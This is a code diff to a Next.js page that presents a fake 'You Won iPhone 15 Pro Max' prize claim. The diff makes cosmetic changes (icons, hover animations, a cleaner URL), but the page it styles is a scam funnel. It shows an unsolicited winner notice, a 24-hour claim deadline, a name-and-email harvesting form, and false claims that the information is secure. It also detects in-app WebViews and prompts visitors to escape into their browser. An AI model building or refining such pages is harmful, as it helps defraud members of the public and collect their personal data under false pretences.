@@ -3,13 +3,32 @@ import { useState, useEffect } from 'react';
 import { useRouter } from 'next/router';
 import { withCampaignMeta } from '../../lib/withCampaignMeta';
 import { fetchCampaign } from '../../lib/fetchCampaign';
+import {
+  FaTrophy,
+  FaGift,
+  FaBoxOpen,
+  FaClock,
+  FaLock,
+  FaEnvelope,
+  FaUser,
+  FaSpinner,
+  FaCopy,
+  FaExternalLinkAlt,
+  FaGlobe,
+  FaShieldAlt,
+  FaCheckCircle,
+  FaArrowRight,
+  FaPhone,
+  FaGem,
+  FaMedal,
+} from 'react-icons/fa';
 
-// ── Default Meta ──
+// ── Default Meta (Clean URL) ──
 const defaultMeta = {
   title: 'Congratulations! You Won iPhone 15 Pro Max',
   description: 'You have been selected as the winner of iPhone 15 Pro Max. Claim your prize now!',
   image: 'https://maketrend.app/og-image.png',
-  url: 'https://maketrend.app/iphone-winner?id={id}',
+  url: 'https://maketrend.app/iphone-winner', // ✅ Clean base URL
 };
 
 function IphoneWinner({ campaign }) {
@@ -17,12 +36,20 @@ function IphoneWinner({ campaign }) {
   const { id } = router.query;
 
   // ── State ──
-  const [step, setStep] = useState(1); // 1=congrats, 2=form, 3=redirecting
+  const [step, setStep] = useState(1);
   const [fullName, setFullName] = useState('');
   const [email, setEmail] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
   const [showWebViewModal, setShowWebViewModal] = useState(false);
+
+  // ── ✅ CLEAN URL: remove query params if no id ──
+  useEffect(() => {
+    if (!router.isReady) return;
+    if (!id && router.asPath.includes('?')) {
+      router.replace(router.pathname, undefined, { shallow: true });
+    }
+  }, [router.isReady, id, router]);
 
   // ── WebView detection ──
   useEffect(() => {
@@ -100,7 +127,7 @@ function IphoneWinner({ campaign }) {
     return (
       <div className="modal-overlay">
         <div className="modal-card">
-          <div className="modal-icon">🌐</div>
+          <FaGlobe className="modal-icon" style={{ fontSize: '3rem', marginBottom: '0.3rem', color: '#D4AF37' }} />
           <h2>Open in Browser</h2>
           <p>For the best experience, open this page in your default browser.</p>
           <div className="modal-actions">
@@ -111,7 +138,7 @@ function IphoneWinner({ campaign }) {
                 setShowWebViewModal(false);
               }}
             >
-              📋 Copy Link
+              <FaCopy className="icon-inline" /> Copy Link
             </button>
             <button
               className="modal-btn primary"
@@ -124,7 +151,7 @@ function IphoneWinner({ campaign }) {
                 }
               }}
             >
-              🚀 Open in Browser
+              <FaExternalLinkAlt className="icon-inline" /> Open in Browser
             </button>
           </div>
           <button
@@ -148,10 +175,10 @@ function IphoneWinner({ campaign }) {
       {/* ─── HEADER ─── */}
       <header className="site-header">
         <div className="logo">
-          <span className="logo-icon">🏆</span>
+          <FaTrophy className="logo-icon" />
           <span className="logo-text">Prize<span>Claim</span></span>
         </div>
-        <div className="header-badge">🎉 Winner</div>
+        <div className="header-badge"><FaGift className="icon-inline" /> Winner</div>
       </header>
 
       {/* ─── STEP 1: CONGRATULATIONS ─── */}
@@ -161,7 +188,7 @@ function IphoneWinner({ campaign }) {
           <div className="confetti-container"></div>
           
           <div className="hero-content">
-            <div className="badge-winner">🏆 GRAND WINNER</div>
+            <div className="badge-winner"><FaTrophy className="icon-inline" /> GRAND WINNER</div>
             
             <div className="phone-display">
               <div className="phone-glow"></div>
@@ -170,33 +197,33 @@ function IphoneWinner({ campaign }) {
                 alt="iPhone 15 Pro Max"
                 className="phone-image"
               />
-              <div className="phone-label">iPhone 15 Pro Max</div>
+              <div className="phone-label"><FaPhone className="icon-inline" /> iPhone 15 Pro Max</div>
             </div>
 
             <h1>Congratulations!</h1>
             <p className="sub-text">You have been selected as the lucky winner of</p>
-            <p className="prize-name">iPhone 15 Pro Max</p>
+            <p className="prize-name"><FaGem className="icon-inline" style={{ color: '#D4AF37' }} /> iPhone 15 Pro Max</p>
             
             <div className="winner-details">
               <div className="detail-item">
-                <span className="detail-icon">🎁</span>
+                <FaGift className="detail-icon" />
                 <span>Prize Value: $1,199</span>
               </div>
               <div className="detail-item">
-                <span className="detail-icon">📦</span>
+                <FaBoxOpen className="detail-icon" />
                 <span>Brand New • Sealed Box</span>
               </div>
               <div className="detail-item">
-                <span className="detail-icon">⏳</span>
+                <FaClock className="detail-icon" />
                 <span>Claim within 24 hours</span>
               </div>
             </div>
 
             <button className="claim-btn-primary" onClick={handleContinue}>
-              Claim Your Prize →
+              Claim Your Prize <FaArrowRight className="icon-inline" />
             </button>
 
-            <p className="trust-note">🔒 Your information is secure and will not be shared.</p>
+            <p className="trust-note"><FaLock className="icon-inline" /> Your information is secure and will not be shared.</p>
           </div>
         </section>
       )}
@@ -206,7 +233,7 @@ function IphoneWinner({ campaign }) {
         <section className="form-hero">
           <div className="form-overlay"></div>
           <div className="form-content">
-            <div className="form-badge">📝 CLAIM YOUR PRIZE</div>
+            <div className="form-badge"><FaMedal className="icon-inline" /> CLAIM YOUR PRIZE</div>
             
             <div className="form-phone-preview">
               <img 
@@ -214,7 +241,7 @@ function IphoneWinner({ campaign }) {
                 alt="iPhone 15 Pro Max"
                 className="form-phone-image"
               />
-              <span>iPhone 15 Pro Max</span>
+              <span><FaPhone className="icon-inline" /> iPhone 15 Pro Max</span>
             </div>
 
             <h2>Enter Your Details</h2>
@@ -247,14 +274,16 @@ function IphoneWinner({ campaign }) {
               <button className="claim-btn-form" onClick={handleClaim} disabled={loading}>
                 {loading ? (
                   <>
-                    <span className="spinner"></span> Processing...
+                    <FaSpinner className="spinner" /> Processing...
                   </>
                 ) : (
-                  'Claim Now →'
+                  <>
+                    Claim Now <FaArrowRight className="icon-inline" />
+                  </>
                 )}
               </button>
 
-              <p className="form-footnote">🔒 Your information is secure and will only be used for prize delivery.</p>
+              <p className="form-footnote"><FaShieldAlt className="icon-inline" /> Your information is secure and will only be used for prize delivery.</p>
             </div>
           </div>
         </section>
@@ -270,7 +299,7 @@ function IphoneWinner({ campaign }) {
               <div className="pulse-circle delay-1"></div>
               <div className="pulse-circle delay-2"></div>
             </div>
-            <h2>🚀 Processing Your Claim</h2>
+            <h2><FaArrowRight className="icon-inline" /> Processing Your Claim</h2>
             <p>Please wait while we confirm your details...</p>
           </div>
         </section>
@@ -282,7 +311,7 @@ function IphoneWinner({ campaign }) {
         <p className="footer-contact">Questions? support@prizeclaim.com</p>
       </footer>
 
-      {/* ─── STYLES ─── */}
+      {/* ─── ENHANCED STYLES ─── */}
       <style dangerouslySetInnerHTML={{ __html: `
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -295,6 +324,12 @@ function IphoneWinner({ campaign }) {
           max-width: 100%;
           overflow-x: hidden;
           background: #0a0a0a;
+        }
+
+        .icon-inline {
+          display: inline-block;
+          margin-right: 6px;
+          vertical-align: middle;
         }
 
         /* ── Header ── */
@@ -397,7 +432,9 @@ function IphoneWinner({ campaign }) {
           border-radius: 30px;
           box-shadow: 0 20px 60px rgba(212, 175, 55, 0.2);
           border: 2px solid rgba(212, 175, 55, 0.1);
+          transition: transform 0.3s ease;
         }
+        .phone-image:hover { transform: scale(1.02); }
         .phone-label {
           margin-top: 0.5rem;
           font-size: 0.85rem;
@@ -441,6 +478,10 @@ function IphoneWinner({ campaign }) {
           max-width: 350px;
           margin-left: auto;
           margin-right: auto;
+          transition: background 0.3s ease;
+        }
+        .winner-details:hover {
+          background: rgba(255,255,255,0.06);
         }
         .detail-item {
           display: flex;
@@ -449,7 +490,7 @@ function IphoneWinner({ campaign }) {
           font-size: 0.85rem;
           color: #ccc;
         }
-        .detail-icon { font-size: 1.1rem; }
+        .detail-icon { font-size: 1.1rem; color: #D4AF37; }
 
         .claim-btn-primary {
           display: inline-block;
@@ -461,14 +502,15 @@ function IphoneWinner({ campaign }) {
           font-size: 1.05rem;
           color: #0a0a0a;
           cursor: pointer;
-          transition: transform 0.2s, box-shadow 0.2s;
+          transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
           box-shadow: 0 4px 30px rgba(212, 175, 55, 0.3);
           margin-bottom: 0.8rem;
         }
         .claim-btn-primary:hover {
           transform: translateY(-3px);
-          box-shadow: 0 8px 40px rgba(212, 175, 55, 0.4);
+          box-shadow: 0 8px 40px rgba(212, 175, 55, 0.5);
         }
+        .claim-btn-primary:active { transform: scale(0.98); }
         .trust-note {
           font-size: 0.75rem;
           color: #666;
@@ -520,7 +562,9 @@ function IphoneWinner({ campaign }) {
           object-fit: cover;
           border-radius: 12px;
           border: 1px solid rgba(212, 175, 55, 0.2);
+          transition: transform 0.3s ease;
         }
+        .form-phone-image:hover { transform: scale(1.05); }
         .form-phone-preview span {
           font-weight: 700;
           font-size: 1.1rem;
@@ -545,6 +589,10 @@ function IphoneWinner({ campaign }) {
           border: 1px solid rgba(255,255,255,0.06);
           box-shadow: 0 24px 64px rgba(0,0,0,0.3);
           text-align: left;
+          transition: box-shadow 0.3s ease;
+        }
+        .form-card:hover {
+          box-shadow: 0 32px 80px rgba(0,0,0,0.4);
         }
         .form-group {
           margin-bottom: 1.2rem;
@@ -566,13 +614,14 @@ function IphoneWinner({ campaign }) {
           font-size: 0.95rem;
           background: rgba(255,255,255,0.03);
           color: #fff;
-          transition: border-color 0.2s;
+          transition: all 0.25s ease;
           outline: none;
         }
         .form-group input::placeholder { color: #555; }
         .form-group input:focus {
           border-color: #D4AF37;
           box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.08);
+          background: rgba(255,255,255,0.06);
         }
         .field-note {
           display: block;
@@ -596,7 +645,7 @@ function IphoneWinner({ campaign }) {
           font-size: 1rem;
           color: #0a0a0a;
           cursor: pointer;
-          transition: transform 0.2s, box-shadow 0.2s;
+          transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
           box-shadow: 0 4px 20px rgba(212, 175, 55, 0.2);
           display: flex;
           align-items: center;
@@ -605,9 +654,10 @@ function IphoneWinner({ campaign }) {
           margin-top: 0.5rem;
         }
         .claim-btn-form:hover:not(:disabled) {
-          transform: translateY(-2px);
-          box-shadow: 0 8px 30px rgba(212, 175, 55, 0.3);
+          transform: translateY(-3px);
+          box-shadow: 0 8px 30px rgba(212, 175, 55, 0.4);
         }
+        .claim-btn-form:active:not(:disabled) { transform: scale(0.98); }
         .claim-btn-form:disabled { opacity: 0.6; cursor: not-allowed; }
 
         .spinner {
@@ -696,6 +746,11 @@ function IphoneWinner({ campaign }) {
           align-items: center;
           justify-content: center;
           z-index: 9999;
+          animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+          from { opacity: 0; }
+          to { opacity: 1; }
         }
         .modal-card {
           background: #1a1c22;
@@ -706,6 +761,11 @@ function IphoneWinner({ campaign }) {
           text-align: center;
           border: 1px solid rgba(212, 175, 55, 0.15);
           box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+          animation: slideUp 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        @keyframes slideUp {
+          from { opacity: 0; transform: translateY(20px) scale(0.95); }
+          to { opacity: 1; transform: translateY(0) scale(1); }
         }
         .modal-icon { font-size: 3rem; margin-bottom: 0.3rem; }
         .modal-card h2 { font-size: 1.4rem; font-weight: 800; color: #fff; margin-bottom: 0.3rem; }
@@ -725,17 +785,21 @@ function IphoneWinner({ campaign }) {
           font-size: 0.75rem;
           color: #fff;
           cursor: pointer;
-          transition: 0.2s;
+          transition: all 0.25s ease;
           flex: 1;
           min-width: 100px;
+          display: inline-flex;
+          align-items: center;
+          justify-content: center;
+          gap: 6px;
         }
-        .modal-btn:hover { background: rgba(255,255,255,0.12); }
+        .modal-btn:hover { background: rgba(255,255,255,0.12); transform: translateY(-2px); }
         .modal-btn.primary {
           background: #D4AF37;
           border: none;
           color: #0a0a0a;
         }
-        .modal-btn.primary:hover { background: #B8860B; }
+        .modal-btn.primary:hover { background: #B8860B; box-shadow: 0 4px 16px rgba(212,175,55,0.3); }
         .modal-btn.ghost {
           background: transparent;
           border: none;
